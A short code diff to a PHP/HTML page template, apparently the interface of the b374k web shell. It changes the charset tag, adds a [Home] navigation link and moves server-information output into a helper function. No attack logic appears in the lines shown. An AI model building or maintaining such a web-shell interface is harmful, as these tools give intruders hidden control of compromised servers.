@@ -10,7 +10,7 @@
 <html>
 <head>
 <title><?php echo $GLOBALS['title']." ".$GLOBALS['ver'];?></title>
-<meta charset='utf-8'>
+<meta charset='<?php echo DETECT_SYS_CHARSET; ?>'>
 <meta name='robots' content='noindex, nofollow, noarchive'>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
 <link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k');?>'>
@@ -34,7 +34,9 @@
 		<!--header info start-->
 		<div id='headerNav'>
 			<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
-			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
+			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;
+			<span id='nav'><?php echo $nav; ?></span>
+			<font color="#FFFFFF"><a class="navbar" data-path="<?php echo $GLOBALS['home_cwd']; ?>">[Home]</a></font>
 
 			<a class='boxclose' id='logout' title='log out'>x</a>
 			<a class='boxclose' id='showinfo' title='show info'>v</a>
@@ -59,12 +61,10 @@
 		<!--server info start-->
 		<div id='basicInfo'>
 			<div id='toggleBasicInfo'></div>
-			<?php
-			echo $error_html;
-			foreach(get_server_info() as $k=>$v){
-				echo "<div>".$v."</div>";
-			}
-			?>
+			<?php echo $error_html; ?>
+			<div id='basicInfoContent'>
+				<?php echo get_server_info_html(); ?>
+			</div>
 		</div>
 		<!--server info end-->
 
